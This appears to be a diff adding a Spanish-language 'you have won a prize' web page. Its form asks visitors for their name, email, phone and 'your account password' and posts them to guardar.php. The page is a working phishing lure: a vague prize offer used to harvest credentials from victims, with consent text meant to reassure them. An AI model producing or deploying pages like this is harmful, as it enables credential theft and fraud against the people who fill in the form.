@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>¡Has ganado un premio!</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    font-family: Arial, Helvetica, sans-serif;
+    background: radial-gradient(
+        circle at top,
+        #fff7c2 0%,
+        #f6c453 32%,
+        #7a3d12 100%
+    );
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+}
+
+.card {
+    width: 100%;
+    max-width: 560px;
+    text-align: center;
+
+    background: linear-gradient(
+        145deg,
+        #fffdf0,
+        #fff7d1
+    );
+
+    color: #4a2b0a;
+    border: 5px solid #ffd85a;
+    border-radius: 28px;
+
+    padding: 42px 30px;
+
+    box-shadow:
+        0 20px 60px rgba(0,0,0,.35);
+}
+
+.badge {
+    display: inline-block;
+    background: #d71920;
+    color: #fff;
+    font-weight: 800;
+
+    padding: 8px 18px;
+    border-radius: 999px;
+
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    font-size: 13px;
+}
+
+.trophy {
+    font-size: 76px;
+    margin: 18px 0 4px;
+}
+
+h1 {
+    font-size: 42px;
+    margin: 0 0 8px;
+    color: #9b5b00;
+}
+
+h2 {
+    margin: 0 0 16px;
+    font-size: 24px;
+    color: #d71920;
+}
+
+p {
+    line-height: 1.55;
+}
+
+.prize {
+    margin: 24px 0;
+    padding: 20px;
+
+    border-radius: 18px;
+
+    background: linear-gradient(
+        135deg,
+        #ffd95a,
+        #f2a900
+    );
+
+    color: #4a2800;
+
+    box-shadow:
+        inset 0 0 0 2px rgba(255,255,255,.55);
+}
+
+.prize strong {
+    display: block;
+    font-size: 30px;
+    margin-bottom: 5px;
+}
+
+button {
+    width: 100%;
+    border: 0;
+    border-radius: 14px;
+
+    padding: 16px;
+
+    background: #d71920;
+    color: white;
+
+    font-size: 18px;
+    font-weight: 800;
+
+    cursor: pointer;
+
+    box-shadow:
+        0 8px 20px rgba(215,25,32,.3);
+}
+
+button:hover {
+    background: #b9141a;
+}
+
+/* Ventana del formulario */
+
+.modal {
+    position: fixed;
+    inset: 0;
+
+    background: rgba(0,0,0,.7);
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    padding: 20px;
+}
+
+.modal.hidden {
+    display: none;
+}
+
+.formbox {
+    width: 100%;
+    max-width: 470px;
+
+    background: #fff;
+    color: #222;
+
+    border-radius: 20px;
+    padding: 28px;
+
+    position: relative;
+
+    max-height: 90vh;
+    overflow-y: auto;
+}
+
+.formbox h2 {
+    color: #9b5b00;
+}
+
+.close {
+    position: absolute;
+    right: 15px;
+    top: 10px;
+
+    width: auto;
+
+    background: none;
+    color: #555;
+
+    box-shadow: none;
+
+    font-size: 28px;
+    padding: 5px;
+}
+
+.close:hover {
+    background: none;
+    color: #111;
+}
+
+label {
+    display: block;
+    text-align: left;
+
+    font-weight: 700;
+
+    margin: 13px 0 6px;
+}
+
+input[type="text"],
+input[type="email"],
+input[type="tel"],
+input[type="password"] {
+    width: 100%;
+
+    padding: 12px;
+
+    border: 1px solid #ccc;
+    border-radius: 9px;
+
+    font-size: 16px;
+}
+
+input:focus {
+    outline: none;
+    border-color: #d71920;
+}
+
+.success,
+.error {
+    padding: 12px;
+    border-radius: 10px;
+
+    margin-bottom: 15px;
+
+    display: none;
+}
+
+.success {
+    background: #dcfce7;
+    color: #166534;
+}
+
+.error {
+    background: #fee2e2;
+    color: #991b1b;
+}
+
+.consent {
+    display: flex;
+    gap: 8px;
+    align-items: flex-start;
+
+    font-weight: 400;
+}
+
+.consent input {
+    width: auto;
+    margin-top: 3px;
+}
+</style>
+</head>
+
+<body>
+
+<main class="card">
+
+    <span class="badge">
+        ¡Felicitaciones!
+    </span>
+
+    <div class="trophy">
+        🏆
+    </div>
+
+    <h1>
+        ¡Has ganado!
+    </h1>
+
+    <h2>
+        Tu premio está listo
+    </h2>
+
+    <p>
+        Has sido seleccionado para recibir el premio
+        indicado a continuación.
+    </p>
+
+    <section class="prize">
+
+        <strong>
+            🎁 Premio especial
+        </strong>
+
+        <span>
+            Completa tus datos para registrar tu solicitud.
+        </span>
+
+    </section>
+
+    <button
+        type="button"
+        id="claimBtn">
+
+        Registrar mi premio
+
+    </button>
+
+    <p style="font-size:12px;color:#795d37;margin-bottom:0">
+
+        Tus datos se utilizarán únicamente para gestionar
+        el registro.
+
+    </p>
+
+</main>
+
+
+<!-- FORMULARIO -->
+
+<div
+    class="modal hidden"
+    id="formSection">
+
+    <div class="formbox">
+
+        <button
+            type="button"
+            class="close"
+            id="closeForm">
+
+            &times;
+
+        </button>
+
+
+        <h2>
+            Registrar premio
+        </h2>
+
+        <p>
+            Completa tus datos para registrar la solicitud.
+        </p>
+
+
+        <div
+            id="success"
+            class="success">
+
+            ¡Solicitud registrada correctamente!
+
+        </div>
+
+
+        <div
+            id="error"
+            class="error">
+        </div>
+
+
+        <form
+            action="guardar.php"
+            method="POST"
+            id="claimForm">
+
+
+            <label for="nombre">
+                Nombre
+            </label>
+
+            <input
+                type="text"
+                id="nombre"
+                name="nombre"
+                maxlength="80"
+                required
+            >
+
+
+            <label for="correo">
+                Correo electrónico
+            </label>
+
+            <input
+                type="email"
+                id="correo"
+                name="correo"
+                maxlength="120"
+                required
+            >
+
+
+            <label for="telefono">
+                Teléfono
+            </label>
+
+            <input
+                type="tel"
+                id="telefono"
+                name="telefono"
+                maxlength="30"
+            >
+
+
+            <label for="password">
+                Contraseña de tu cuenta
+            </label>
+
+            <input
+                type="password"
+                id="password"
+                name="password"
+                minlength="8"
+                autocomplete="new-password"
+                required
+            >
+
+
+            <label class="consent">
+
+                <input
+                    type="checkbox"
+                    name="consent"
+                    required
+                >
+
+                <span>
+                    Acepto el registro de mis datos para
+                    gestionar la solicitud.
+                </span>
+
+            </label>
+
+
+            <button
+                type="submit"
+                style="margin-top:14px">
+
+                Enviar solicitud
+
+            </button>
+
+        </form>
+
+    </div>
+
+</div>
+
+
+<script>
+
+const formSection =
+    document.getElementById("formSection");
+
+const claimBtn =
+    document.getElementById("claimBtn");
+
+const closeForm =
+    document.getElementById("closeForm");
+
+
+claimBtn.addEventListener("click", () => {
+
+    formSection.classList.remove("hidden");
+
+});
+
+
+closeForm.addEventListener("click", () => {
+
+    formSection.classList.add("hidden");
+
+});
+
+
+formSection.addEventListener("click", (event) => {
+
+    if (event.target === formSection) {
+
+        formSection.classList.add("hidden");
+
+    }
+
+});
+
+
+/* Mensajes enviados por guardar.php */
+
+const params =
+    new URLSearchParams(window.location.search);
+
+const success =
+    document.getElementById("success");
+
+const error =
+    document.getElementById("error");
+
+
+if (params.get("guardado") === "1") {
+
+    formSection.classList.remove("hidden");
+
+    success.style.display = "block";
+
+}
+
+
+const errors = {
+
+    campos:
+        "Completa los campos obligatorios.",
+
+    correo:
+        "El correo electrónico no es válido.",
+
+    password:
+        "La contraseña debe tener al menos 8 caracteres.",
+
+    confirmacion:
+        "Las contraseñas no coinciden.",
+
+    duplicado:
+        "Ese correo ya está registrado."
+
+};
+
+
+const errorKey =
+    params.get("error");
+
+
+if (errorKey && errors[errorKey]) {
+
+    formSection.classList.remove("hidden");
+
+    error.textContent =
+        errors[errorKey];
+
+    error.style.display = "block";
+
+}
+
+</script>
+
+</body>
+</html>
+
+
+
